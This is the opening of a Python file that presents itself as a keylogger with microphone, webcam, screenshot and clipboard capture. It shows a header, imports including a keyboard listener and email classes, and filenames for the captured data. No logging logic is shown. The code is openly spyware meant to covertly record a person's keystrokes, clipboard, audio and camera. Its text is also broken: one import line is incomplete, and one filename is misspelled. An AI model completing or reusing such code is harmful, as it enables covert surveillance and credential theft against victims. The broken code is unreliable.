"""
Program: KeyLogger (with Microphone, WebCamera, Screenshots, Audio Logging Feature)
Author: Sushilkumar Yadav
Date: 05/08/2022
"""

# Libraries
from email.mime.multipart import MIMEMultipart
from email import encoders
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wav


# Global Variables
keys_info = "key_log.txt"
system_info = "syseminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
webCamShot_info = "webCamera.png"

keys_info_e = "e_key_log.txt"
system_info_e = "e_systeminfo.txt"
clipboard_info_e = "e_clipboard.txt"